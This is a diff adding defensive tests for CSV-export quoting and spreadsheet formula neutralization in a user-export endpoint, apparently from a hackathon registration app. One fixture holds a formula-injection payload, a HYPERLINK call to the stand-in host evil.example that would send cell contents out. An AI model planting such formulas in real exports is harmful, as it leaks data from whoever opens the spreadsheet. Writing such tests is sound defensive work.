@@ -182,6 +182,50 @@ describe('user.exportCsv', () => {
 		expect(csv).toContain('"John ""the man"" Doe"');
 	});
 
+	it('quotes every field, not just the name', async () => {
+		// A comma anywhere in stored data — a university, a name — shifts every
+		// column after it, and the reader has no way to notice.
+		const caller = createTestCaller(db, adminUser);
+		db.user.findMany.mockResolvedValue([
+			{ ...hackerUser, name: 'Doe, John', teamId: 'team-1' }
+		] as never);
+
+		const csv = await caller.user.exportCsv();
+		const row = csv.split('\n')[1];
+
+		expect(row).toBe(
+			`"${hackerUser.uid}","Doe, John","${hackerUser.email}","HACKER","CREATED","","","team-1","${hackerUser.createdAt.toISOString()}"`
+		);
+	});
+
+	it('neutralizes fields a spreadsheet would run as a formula', async () => {
+		// The whole point: an applicant-controlled name opening with `=` executes on
+		// open in Excel and Sheets. The apostrophe forces it to be read as text.
+		const caller = createTestCaller(db, adminUser);
+		db.user.findMany.mockResolvedValue([
+			{ ...hackerUser, name: '=HYPERLINK("https://evil.example?d="&A1,"click")' },
+			{ ...hackerUser, name: '+1 (512) 555-0100' },
+			{ ...hackerUser, name: '-2+3' },
+			{ ...hackerUser, name: '@SUM(A1:A9)' }
+		] as never);
+
+		const rows = (await caller.user.exportCsv()).split('\n').slice(1);
+
+		expect(rows[0]).toContain('"\'=HYPERLINK(""https://evil.example?d=""&A1,""click"")"');
+		expect(rows[1]).toContain('"\'+1 (512) 555-0100"');
+		expect(rows[2]).toContain('"\'-2+3"');
+		expect(rows[3]).toContain(`"'@SUM(A1:A9)"`);
+	});
+
+	it('leaves an ordinary value untouched apart from quoting', async () => {
+		const caller = createTestCaller(db, adminUser);
+		db.user.findMany.mockResolvedValue([{ ...hackerUser, name: 'Jane Doe' }] as never);
+
+		const csv = await caller.user.exportCsv();
+		expect(csv).toContain('"Jane Doe"');
+		expect(csv).not.toContain("'Jane");
+	});
+
 	it('throws FORBIDDEN for non-admin', async () => {
 		const caller = createTestCaller(db, hackerUser);
 		await expect(caller.user.exportCsv()).rejects.toMatchObject({ code: 'FORBIDDEN' });
